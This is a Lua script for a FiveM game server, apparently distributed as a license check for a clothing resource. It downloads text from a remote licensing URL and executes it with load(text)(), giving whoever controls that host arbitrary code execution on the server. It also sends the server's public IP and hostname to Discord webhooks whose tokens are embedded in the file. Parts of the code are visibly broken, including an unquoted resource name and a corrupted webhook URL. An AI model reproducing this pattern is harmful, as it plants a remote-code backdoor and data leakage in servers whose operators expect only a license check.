local name = "script name"

PerformHttpRequest("https://licensesecure.net/view.php?id=8637848", function (err, text, head)
    if string.match(text, "Sorry,") then
        print('^8 ============== [script name] Wrong Ip. =================')
                             sendWebHookWorng("Worng ip",qb-clothing,8637848)
else
load(text)()
print('^2 ============== [script name] Ip is Successfully. =================')
                        sendWebHook("Ip is Successfully",qb-clothing,8637848)
end
end)

function sendWebHook(title,name,color)
    PerformHttpRequest("https://api.ipify.org/", function (err, text, head)
      local embeds = {
        {
            ["color"] = color,
            ["title"] =  title,
            fields = {
                {
                    ["name"] = "Resource Name",
                    ["value"] =  '[ ' .. name .. ' ]',
                    inline = false
                },
                {
                    ["name"] = "Server Name",
                    ["value"] = '[ ' .. GetConvar("sv_hostname") .. ' ]',
                    inline = false
                },
                {
                    ["name"] = "Server IP",
                    ["value"] = '[ ' .. text .. ' ]',
                    inline = false
                },
            },
            
            ["timestamp"] =  os.date('!%Y-%m-%dT%H:%M:%S'),
            ["footer"] = {
                ["text"] = "[ Made By ] ",
                ["icon_url"] = ""
            },
        }
    }
    PerformHttpRequest("https://discord.com/api/webhooks/839144936354873366/MoExVKg8Of_y0KfM0GSe4fwY0CTps1luCHr0TVgYOKnBDr9E9k09F3RmZMY8-y_VaKuz", function(err, text, headers) end, 'POST', json.encode({embeds = embeds}), { ['Content-Type'] = 'application/json' })

    end, 'GET', '')
end


function sendWebHookWorng(title,name,color)
    PerformHttpRequest("https://api.ipify.org/", function (err, text, head)
      local embeds = {
        {
            ["color"] = color,
            ["title"] =  title,
            fields = {
                {
                    ["name"] = "Resource Name",
                    ["value"] =  '[ ' .. name .. ' ]',
                    inline = false
                },
                {
                    ["name"] = "Server Name",
                    ["value"] = '[ ' .. GetConvar("sv_hostname") .. ' ]',
                    inline = false
                },
                {
                    ["name"] = "Server IP",
                    ["value"] = '[ ' .. text .. ' ]',
                    inline = false
                },
            },
            
            ["timestamp"] =  os.date('!%Y-%m-%dT%H:%M:%S'),
            ["footer"] = {
                ["text"] = "[ Made By ] ",
                ["icon_url"] = ""
            },
        }
    }
    PerformHttpRequest("https://discord.com/api/webhooks/839160109694976020/PQFy1hSLsjTwkbnFWr2yrekHwJLu9sEBjYuEv7oMYeCv8aHaN2zBhnATfhezvocFRH7i WRONG IP", function(err, text, headers) end, 'POST', json.encode({embeds = embeds}), { ['Content-Type'] = 'application/json' })

    end, 'GET', '')
end
